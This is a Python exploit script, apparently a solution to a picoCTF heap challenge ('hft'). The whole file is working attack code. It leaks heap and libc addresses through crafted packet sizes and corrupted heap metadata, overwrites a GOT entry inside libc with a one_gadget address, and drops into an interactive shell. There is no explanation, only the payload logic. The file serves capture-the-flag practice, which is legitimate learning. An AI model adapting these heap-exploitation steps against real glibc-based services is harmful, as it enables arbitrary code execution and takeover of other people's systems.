#!/usr/bin/env python
import ptrlib as ptr


elf = ptr.ELF("./hft_patched")
libc = ptr.ELF("libc.so.6")
io = ptr.Process(elf.filepath)
# io = ptr.Socket("tethys.picoctf.net", 55233)


def send(sz, content, option=1):
    io.recvuntil(b"PKT_RES")
    io.send(p32(sz))
    if len(content) != 0:
        payload = p32(0) + p64(option) + content
    else:
        payload = p32(0) + b"\x01\0\0\0\0\0"
    io.sendline(payload)


p64 = ptr.p64
p32 = ptr.p32
u64 = ptr.u64
info = ptr.logger.info

######################
## LEAK HEAP ADDRESS
######################

send(0x10, b"")
send(0x10, b"A" * 8 + p64(0xD31))
send(0x1000, b"B" * (0x1000 - 16))
send(0x8, b"")

io.recvuntil(b":[")
heap_base = u64(io.recvline().strip(b"]")) - 0x2D0
info("HEAP BASE: " + hex(heap_base))


######################
## LEAK LIBC ADDRESS
######################

payload = b"C" * (8 * 6)
payload += p64(heap_base + 0x380)
payload += p64(heap_base + 0x300)
payload += p64(heap_base + 0x300)
payload += p64(heap_base + 0x300)
payload += p64(heap_base + 0x300)
payload += p64(heap_base + 0x300)
send(0x80, payload)

payload = b"D" * 0x316D8 + p64(heap_base + 0x340 - 0x80)
send(0x30001, payload)

send(0x10, b"")
io.recvuntil(b":[")
libc.base = u64(io.recvline().strip(b"]")) - 0x21A2E0

######################
## OVERWRITE GOT INSIDE GOT
######################

# 全ては調べてないが、少なくとも以下の２つのGOTは書き換えるとシェルを取れる。
got_addr = libc.base + 0x219098
# got_addr = libc.base + 0x219090
info(f"GOT ADDRESS BEING OVERWRITTEN: {hex(got_addr)}")

payload = b"F" * 0x626D8 + p64(heap_base + 0x350 - 0x80)
send(0x30001, payload, 0)

payload = b"E" * (8 * 6)
payload += p64(heap_base + 0x300)
payload += p64(heap_base + 0x300)
if got_addr % 0x10 == 0:
    payload += p64(got_addr)
else:
    payload += p64(got_addr - 8)
payload += p64(heap_base + 0x300)
payload += p64(heap_base + 0x300)
payload += p64(heap_base + 0x300)
send(0x10, payload)

one_gadget = 0xEBCF5
io.send(p64(0x10))
io.send(p64(libc.base + one_gadget))

io.recvuntil(b"[PKT_RES]")
io.sendline(p64(0x10))
io.sh()
